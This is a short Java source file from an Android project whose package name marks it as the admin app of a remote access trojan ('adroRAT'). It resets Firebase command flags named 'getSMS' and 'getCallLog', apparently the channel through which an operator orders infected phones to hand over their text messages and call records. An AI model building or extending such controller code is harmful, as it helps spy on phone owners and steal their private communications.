package com.adroRAT.adminapp;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public   class FirebaseInitialize {

 public static    DatabaseReference MY_REF =FirebaseDatabase.getInstance().getReference();

public static void    FirebaseInitialize()
{
    MY_REF.getDatabase().getReference("requests").child("getSMS").setValue("no");
    MY_REF.getDatabase().getReference("requests").child("getCallLog").setValue("no");
}
}
